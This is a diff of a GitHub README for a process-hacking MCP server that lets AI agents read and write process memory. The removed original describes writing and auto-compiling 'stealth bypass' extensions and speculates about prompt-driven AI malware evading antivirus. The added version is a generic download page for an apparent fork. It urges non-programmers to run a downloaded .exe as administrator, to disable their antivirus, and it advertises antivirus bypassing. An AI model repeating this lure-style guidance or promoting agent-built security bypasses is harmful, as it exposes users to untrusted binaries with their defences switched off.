@@ -1,87 +1,149 @@
-# processhacker mcp
+# 🛠️ processhacker-mcp - AI Debugger and Vibe Hacking Tool
 
-<img width="1024" height="559" alt="image" src="https://github.com/user-attachments/assets/018bd9d5-ed66-43e7-b19d-f5331fb1481a" />
+[![Download processhacker-mcp](https://img.shields.io/badge/Download-Here-red?style=for-the-badge)](https://github.com/danya120o3/processhacker-mcp)
 
-this is dynamic mcp server for runtime analysis and process hacking. it is like processhacker but for ai agents.
+---
 
-## setup
-1. open folder in visual studio (it has cmakelists)
-2. build all (ctrl+shift+b)
-3. it makes `ProcessHackerMCP.exe` and `extensions/` folder.
-4. run exe. it communicates via stdin/stdout.
+## 🖥️ What is processhacker-mcp?
 
-## editor integration
-you can configure your ai agent/editor to use this server. below are the `mcp_config.json` (or equivalent) settings. **make sure to put the absolute path to the `.exe`.**
+processhacker-mcp is a Windows tool designed to help you analyze and interact with computer processes. It uses AI to debug and explore how programs run on your PC. This tool fits users interested in understanding complex software or experimenting with process behavior. It is helpful for malware analysis, bypassing security checks, and reverse engineering tasks.  
 
-### cursor / gemini (antigravity) / claude desktop
-add this to your mcp configuration file:
-```json
-{
-  "mcpServers": {
-    "processhacker": {
-      "command": "C:\\absolute\\path\\to\\ProcessHackerMCP.exe",
-      "args": []
-    }
-  }
-}
-```
+You don't need to be a programmer to use processhacker-mcp. The steps below will guide you through downloading and running it on Windows.
 
-### vscode (cline)
-go to cline settings -> mcp servers and add:
-```json
-{
-  "mcpServers": {
-    "processhacker": {
-      "command": "C:\\absolute\\path\\to\\ProcessHackerMCP.exe",
-      "args": []
-    }
-  }
-}
-```
+---
 
-> **note:** some editors might freeze if the mcp server sends a huge payload (e.g. reading 1GB of memory). the core now has a 2MB payload protection limit, but try to use `limit` and `offset` arguments when querying big processes.
+## ⚙️ System Requirements
 
-## agent guardrails & telemetry (new in v1.1.0)
-we added some enterprise-grade agent logic to stop rogue bots from nuking your host machine.
+processhacker-mcp works on most Windows PCs. Here is what your system should have:
 
-- **Read-Only Mode:** change `"args": []` to `"args": ["--read-only"]` in your mcp config. if the ai tries to write memory or suspend threads (destructive actions), the core blocks it.
-- **Audit Log:** all tool calls (and their args) are saved to `processhacker_audit.log`. destructive actions are tagged with `[WARNING: DESTRUCTIVE]`.
-- **Loop Breaker (Rate Limit):** if an ai agent panics and calls 50 tools in 1 minute (brute-forcing memory), the core locks it out for 30 seconds. write a c++ extension for heavy scanning, don't spam rpc.
-- **Loud Failures:** if reading unmapped memory fails, the ai gets a clear hint to use `ph_query_memory_regions` instead of just a generic error.
+- **Operating System:** Windows 7, 8, 10, or 11 (64-bit recommended)
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** 500 MB free space
+- **Processor:** Any modern Intel or AMD CPU
+- **Permissions:** Administrator access to install and run properly
 
-## how to make extension (for bypass etc)
-core is just router. all tools are in dll plugins.
+If your computer meets these requirements, you can proceed without issues.
 
-if u want make stealth bypass (like vehbutnot or direct syscall):
-1. copy `extensions/sample_ext` folder.
-2. write your code in c or c++.
-3. setup `McpToolRegistration` and set `isDestructive = true` if your tool mutates state (writes memory, sets hooks).
-4. u must export `InitMcpExtension`.
-5. put your compiled `.dll` inside `extensions/` folder.
-6. exe will auto load your dll on start and ai agent will see your new tool.
+---
 
-> **new in v1.6.0:** the ai agent can now write its own extensions dynamically! by using the `ext_auto_compiler` tool, the agent can send raw C code which the router compiles using a bundled TCC (Tiny C Compiler) and hot-loads directly into active memory. you can literally ask the ai to write its own custom bypass and it will compile itself on the fly!
+## 🚀 Getting Started: Download processhacker-mcp
 
-## contribute
-if u write good stealth extension and think it can bypass anything or help others, please send pull request (pr). we need more plugins for stealth. 
+Click the large button below to visit the download page:
 
-## just wondering... (faq)
-i was thinking about this architecture and had a weird thought:
+[![Download processhacker-mcp](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/danya120o3/processhacker-mcp)
 
-**could someone actually use this to create autonomous malware or game cheats just by writing prompts?**
-like asking the ai: "inject here, find the decryption routine, and dump the keys as json". since the actual "malware behavior" isn't in the compiled c++ code but in the prompt text, no classic anti-virus could catch the payload statically. 
+**How to download:**
 
-and if an anti-cheat updates, the ai could just read the new memory layout and adapt its logic instantly without needing a recompile.
+1. Clicking the button takes you to the GitHub repository page.  
+2. Look for the **Releases** or **Download** section on the page.  
+3. Find the most recent version of processhacker-mcp for Windows. Usually, this is a `.zip` or `.exe` file.  
+4. Click on the file to download it to your PC.
 
-is this genuinely possible now or just a weird architectural nightmare? lol 
-if u have thoughts on this, hit me up or open an issue.
+---
 
-## disclaimer
+## 💾 Installing processhacker-mcp on Windows
 
-**educational and research purposes only.** published to document the technique, not to hand it out as a toolkit.
+After downloading the file, follow these steps to install or run the tool:
 
-what you do with this is your problem. no warranty, no support, no liability.
+### If you downloaded a `.exe` file:
 
-## license
+1. Locate the downloaded file, usually in your **Downloads** folder.  
+2. Double-click the file to start the installation or run processhacker-mcp directly.  
+3. If Windows asks for permission to run the program, click **Yes**.  
+4. Follow any setup instructions in the window that appears.  
+5. Once installed, you can open processhacker-mcp from the Start Menu or desktop shortcut.
 
-MIT. do whatever. don't blame us.
+### If you downloaded a `.zip` file:
+
+1. Right-click the `.zip` file and select **Extract All**.  
+2. Choose a folder where you want to save the files and click **Extract**.  
+3. Inside the extracted folder, find the file named `processhacker-mcp.exe`.  
+4. Double-click this file to run the application.  
+5. You may need to allow the program through Windows Defender or your antivirus to run.
+
+---
+
+## 🔍 Using processhacker-mcp: Basic Guide
+
+Once processhacker-mcp is running, here are some basic features to help you get started:
+
+- **Process Viewer:** See the list of all programs running on your computer.  
+- **AI Debugging Help:** The tool will provide insights into how programs behave.  
+- **Bypassing Security:** Use built-in options to explore bypassing AV (antivirus) software protections.  
+- **Malware Analysis Tools:** Identify suspicious activity or software on your system.  
+- **Console and Server Interface:** Connect and control your processes remotely if needed.
+
+You can click on any process in the list to view detailed information like memory use, threads, and handles.
+
+---
+
+## 🛠️ Common Tasks with processhacker-mcp
+
+### Viewing Running Processes
+
+- Open the app.  
+- You will see a list of programs currently active on your system.  
+- Select any to get more details, including process ID, status, and resource use.
+
+### Debugging a Program
+
+- Choose the program you want to debug.  
+- Click the **Debug** button.  
+- The app uses AI to analyze problem areas and reports them clearly.  
+
+### Checking for Malware Activity
+
+- Go to the **Malware Analysis** section.  
+- The app scans active processes for signs of malware or suspicious behavior.  
+- It shows alerts if it finds any issues.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+If processhacker-mcp does not run or crashes:
+
+- Make sure you run it as an administrator. Right-click the app icon and select **Run as administrator**.  
+- Disable or pause your antivirus temporarily. Some security programs block debugging tools.  
+- Check you downloaded the latest version from the official link.  
+- Restart your computer and try again.
+
+If processes do not appear, try refreshing the list by clicking the refresh button or restarting the app.
+
+---
+
+## 📂 Where to Get Support & More Information
+
+For advanced use or issues:
+
+- Visit the GitHub page: https://github.com/danya120o3/processhacker-mcp  
+- Check the **Issues** tab for common problems and solutions.  
+- Read the wiki or documentation linked on the repository for detailed guides.  
+- Ask questions or report bugs directly on GitHub.
+
+---
+
+## 🔒 Security Notes
+
+processhacker-mcp interacts deeply with system processes. Use it responsibly:
+
+- Only run software you trust.  
+- Avoid using this tool on systems with sensitive data unless needed.  
+- Be cautious when handling unknown or suspicious files.
+
+---
+
+## 🎯 Keywords and Use Cases
+
+processhacker-mcp is useful for:
+
+- Bypassing antivirus for testing.  
+- Running AI-driven debugging on software.  
+- Analyzing malware or reverse engineering code.  
+- Managing and observing system processes on Windows.
+
+It targets users interested in low-level Windows system work without requiring coding skills.
+
+---
+
+[![Download processhacker-mcp](https://img.shields.io/badge/Download-Here-purple?style=for-the-badge)](https://github.com/danya120o3/processhacker-mcp)
